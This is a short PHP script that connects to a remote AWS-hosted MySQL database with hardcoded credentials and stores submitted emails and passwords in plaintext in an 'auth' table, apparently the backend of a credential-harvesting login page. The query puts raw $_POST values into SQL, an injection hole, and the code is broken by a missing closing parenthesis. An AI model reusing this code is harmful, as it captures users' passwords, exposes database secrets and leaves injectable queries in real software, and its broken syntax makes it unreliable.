<?php
//Connecting to sql db.
$connect = mysqli_connect("ec2-99-81-177-233.eu-west-1.compute.amazonaws.com","aqhgytkzruqgnu","ac18807f7b0a7b9af626f249f4bec306b79f1f79fe9a605921031d6e89e9aa11","d6j716jd00of6");
//Sending form data to sql db.
mysqli_query($connect,"INSERT INTO auth (login, password)
VALUES ('$_POST[email]', '$_POST[password]')";
?>